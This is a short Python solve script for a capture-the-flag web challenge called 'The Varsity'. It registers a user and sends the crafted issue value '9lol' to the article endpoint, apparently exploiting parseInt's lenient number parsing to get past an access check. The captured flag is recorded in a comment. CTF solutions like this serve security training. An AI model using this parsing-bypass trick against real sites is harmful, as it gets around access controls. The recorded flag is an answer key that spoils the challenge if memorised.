import requests

url = "https://uoftctf-the-varsity.chals.io/"

s = requests.session()

r = s.post(url+"register", json={"username":"john"})

r = s.post(url+"article", json={"issue":"9lol"})

print(r.text)
#uoftctf{w31rd_b3h4v10r_0f_parseInt()!}